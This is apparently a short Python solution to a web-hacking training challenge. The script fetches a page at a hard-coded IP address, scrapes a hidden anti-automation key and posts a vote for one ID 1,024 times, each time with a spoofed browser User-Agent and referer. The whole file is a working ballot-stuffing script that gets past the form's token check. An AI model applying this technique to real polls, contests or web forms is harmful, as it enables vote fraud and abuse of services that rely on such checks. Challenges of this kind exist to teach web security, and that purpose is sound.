#!/usr/bin/python3
"""2-script module"""
import requests
from bs4 import BeautifulSoup


url = "http://158.69.76.135/level2.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0)'
           + ' Gecko/20100101 Firefox/100.0', 'referer': url}

for i in range(1024):
    session = requests.Session()
    auth = session.get(url, headers=headers).text
    soup = BeautifulSoup(auth, 'html.parser')
    key = soup.find(type="hidden")['value']
    data = {'id': "4281", 'holdthedoor': "submit", 'key': key}
    session.post(url, data=data, headers=headers)
